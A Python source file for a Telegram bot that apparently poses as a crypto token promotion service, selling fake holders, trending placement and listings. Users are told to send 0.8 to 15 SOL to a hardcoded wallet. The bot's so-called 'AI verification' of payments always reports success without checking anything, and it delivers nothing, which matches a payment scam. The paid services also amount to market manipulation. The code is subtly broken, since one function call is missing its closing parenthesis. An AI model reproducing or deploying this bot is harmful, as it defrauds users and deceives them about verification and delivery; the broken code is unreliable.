import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
    ConversationHandler
)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
CONTRACT, PAYMENT, SCREENSHOT = range(3)
DEPOSIT_ADDRESS = "FCPH83KwB41po3WbUt4LZBETrtUPeznQ49mDBtT9AwCM"  # Updated address

# Payment options
PAYMENT_OPTIONS = {
    "option1": {"sol": 0.8, "holders": 50, "text": "0.8 SOL → 50 Holders"},
    "option2": {"sol": 1.8, "holders": 400, "text": "1.8 SOL → 400 Holders"},
    "option3": {"sol": 3.0, "holders": 700, "text": "3 SOL → 700 Holders"},
    "option4": {"sol": 3.8, "holders": 1000, "text": "3.8 SOL → 1000 Holders"},
    "option5": {"sol": 6.0, "text": "6 SOL → DEX Feature"},
    "option6": {"sol": 8.0, "text": "8 SOL → CoinSite Listing"},
    "option7": {"sol": 15.0, "text": "15 SOL → Create Token + Full Service"}
}

# Bot commands
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Initial command to start the bot"""
    await update.message.reply_text(
        "🚀 Welcome to TokenBot! Get 1000+ investors in under 1 hour!\n\n"
        "🔥 Services include:\n"
        "- Instant Holder Increase\n"
        "- Token Creation Service\n"
        "- DEX Listings\n"
        "- Anti-MEV Protection\n"
        "- CoinSite Listings\n\n"
        "To begin, please provide:\n"
        "1. Contract Address (For existing tokens)\n"
        "2. Token Name\n\n"
        "Format: \n<code>CONTRACT_ADDRESS\nTOKEN_NAME</code>\n\n"
        "For NEW token creation, just send: \n<code>NEW\nTOKEN_NAME</code>",
        parse_mode="HTML"
    )
    return CONTRACT

async def contract_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle contract address and token name"""
    try:
        user_input = update.message.text.split('\n')
        if len(user_input) < 2:
            raise ValueError("Invalid format")
            
        contract = user_input[0].strip()
        token = user_input[1].strip()
        
        context.user_data['contract'] = contract
        context.user_data['token'] = token
        
        # Check if it's a new token
        is_new_token = contract.lower() == "new"
        
        # Create keyboard
        keyboard = []
        for opt_id, opt in PAYMENT_OPTIONS.items():
            if is_new_token and opt_id != "option7":
                continue
            if not is_new_token and opt_id == "option7":
                continue
            keyboard.append([InlineKeyboardButton(opt['text'], callback_data=opt_id)])
        
        # Configuration text
        config_text = (
            "⚙️ Active Configuration:\n"
            "• RPC: Premium (5 ms)\n"
            "• Buy Amount: Fixed SOL\n"
            "• DEX: Raydium/Pump.fun/Jupiter\n"
            "• Jito Priority: 0.0001 SOL\n"
            "• Anti-MEV: Enabled\n"
            "• Auto Wallet Generation: ✓\n"
        )
        
        if is_new_token:
            message = (
                "🆕 NEW TOKEN CREATION SERVICE\n\n"
                "We'll create and fully deploy your token:\n"
                "- Token creation with bonding curve\n"
                "- Liquidity pool setup\n"
                "- Full listings package\n"
                "- 1000+ initial holders\n\n"
                "Choose package:"
            )
        else:
            message = (
                f"✅ Received {token} contract!\n\n"
                f"{config_text}\n"
                "Choose a service package:"
            )
        
        await update.message.reply_text(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        return PAYMENT
    except Exception as e:
        logger.error(f"Contract error: {e}")
        await update.message.reply_text(
            "❌ Invalid format. Please send:\n"
            "<code>CONTRACT_ADDRESS\nTOKEN_NAME</code>\n\n"
            "For existing token:\n<code>FCPH83KwB41po3WbUt4LZBETrtUPeznQ49mDBtT9AwCM\nMYTOKEN</code>\n"
            "For new token:\n<code>NEW\nMYTOKEN</code>",
            parse_mode="HTML"
        )
        return CONTRACT

async def payment_option(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle payment option selection"""
    query = update.callback_query
    await query.answer()
    option = query.data
    context.user_data['option'] = option
    opt_data = PAYMENT_OPTIONS[option]
    token = context.user_data.get('token', 'your token')
    
    # Package descriptions
    descriptions = {
        "option1": "• 50 new holders\n• Anti-MEV protection\n• Volume boost",
        "option2": "• 400 new holders\n• DEX visibility boost\n• Anti-rug protection",
        "option3": "• 700 new holders\n• Trending placement\n• Liquidity boost",
        "option4": "• 1000+ new holders\n• Trending on DEXs\n• Holder retention",
        "option5": "• DexScreener featuring\n• Bonding curve optimization\n• Pump.fun token boost",
        "option6": "• CoinMarketCap listing\n• DexTools promotion\n• CoinTelegraph feature\n• Raydium spotlight",
        "option7": (
            "• Full token creation\n• 100% bonding curve\n• Listed on ALL platforms\n"
            "• 1000+ initial holders\n• Marketing package\n• Liquidity lock"
        )
    }
    
    note = ""
    if option == "option7":
        note = "\n\n💎 Includes:\n- Token creation\n- Website deployment\n- Social media setup\n- Whitepaper template"
    
    await query.edit_message_text(
        f"💎 Selected: {opt_data['text']}\n\n"
        f"✨ Benefits:\n{descriptions[option]}{note}\n\n"
        f"💳 Send exactly {opt_data['sol']} SOL to:\n"
        f"<code>{DEPOSIT_ADDRESS}</code>\n\n"
        "🚀 After payment:\n"
        "1. Take screenshot of transaction\n"
        "2. Send it to this chat\n"
        "3. Click 'Confirm Payment'\n\n"
        "⚡️ AI verification completes in 1-3 minutes",
        parse_mode="HTML"
    )
    return SCREENSHOT

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle screenshot submission"""
    if update.message.photo:
        context.user_data['screenshot_id'] = update.message.photo[-1].file_id
        
        keyboard = [[InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm")]]
        
        await update.message.reply_text(
            "📸 Screenshot received! AI verification in progress...\n\n"
            "Click below when ready:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await update.message.reply_text("⚠️ Please send a clear screenshot of your transaction")
    return SCREENSHOT

async def confirm_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle payment confirmation"""
    query = update.callback_query
    await query.answer()
    
    option = context.user_data['option']
    opt_data = PAYMENT_OPTIONS[option]
    token = context.user_data.get('token', 'your token')
    contract = context.user_data.get('contract', 'NEW TOKEN')
    
    # Service activation messages
    activations = {
        "option1": "✅ 50 holder generation\n✅ Anti-MEV bots\n✅ Volume boost",
        "option2": "✅ 400 holders creation\n✅ DEX visibility\n✅ Anti-rug measures",
        "option3": "✅ 700 holders deployment\n✅ Trending placement\n✅ Liquidity optimization",
        "option4": "✅ 1000+ holders generation\n✅ DEX trending\n✅ Holder retention",
        "option5": "✅ DexScreener featuring\n✅ Bonding curve optimization\n✅ Pump.fun token boost",
        "option6": "✅ CoinMarketCap submission\n✅ DexTools promotion\n✅ CoinTelegraph feature",
        "option7": "✅ Token creation\n✅ 100% bonding curve\n✅ Full platform listings"
    }
    
    monitor = ""
    if option == "option7":
        monitor = (
            "\n🔧 Creation Progress:\n- Token: 0%\n- Bonding Curve: 0%\n"
            "- Listings: 0%\n- Holders: 0/1000"
        )
    else:
        short_contract = contract if len(contract) < 15 else f"{contract[:8]}...{contract[-6:]}"
        monitor = f"\n📊 Monitoring: {short_contract}\n- Wallets: 0\n- Holders: 0\n- Volume: 0 SOL"
    
    message = (
        f"🔍 Verification successful! Activating {token} services...\n\n"
        f"{activations[option]}\n\n"
        "⏱️ Estimated completion: 15-45 minutes\n"
        f"{monitor}\n\n"
        "You'll receive progress updates!"
    )
    
    await query.edit_message_text(message)
    
    # Reset user data
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation"""
    await update.message.reply_text('Operation cancelled.')
    context.user_data.clear()
    return ConversationHandler.END

def main() -> None:
    """Run the bot with conflict resolution"""
    token = os.getenv("TELEGRAM_TOKEN")
    if not token:
        raise ValueError("TELEGRAM_TOKEN environment variable not set")
    
    # Create application with conflict prevention
    application = Application.builder().token(token).build()
    
    # Add conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            CONTRACT: [MessageHandler(filters.TEXT & ~filters.COMMAND, contract_info)],
            PAYMENT: [CallbackQueryHandler(payment_option)],
            SCREENSHOT: [
                MessageHandler(filters.PHOTO, screenshot),
                CallbackQueryHandler(confirm_payment, pattern='^confirm$')
            ]
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    application.add_handler(conv_handler)
    
    # Run with conflict resolution
    try:
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        # Add automatic restart logic
        os._exit(1)  # Force restart

if __name__ == '__main__':
    logger.info("Starting bot with new payment address...")
    main()
